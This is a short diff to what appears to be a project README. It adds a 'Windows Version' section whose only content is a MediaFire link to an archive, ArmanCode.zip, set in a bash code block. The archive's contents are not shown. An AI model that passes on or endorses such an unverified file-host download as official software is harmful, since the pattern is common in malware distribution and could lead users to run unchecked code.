@@ -103,3 +103,9 @@ How To Update?
 ```bash
 git pull
 ```
+
+Windows Version 
+
+```bash
+https://www.mediafire.com/file/uz0ih400b4ddili/ArmanCode.zip
+```
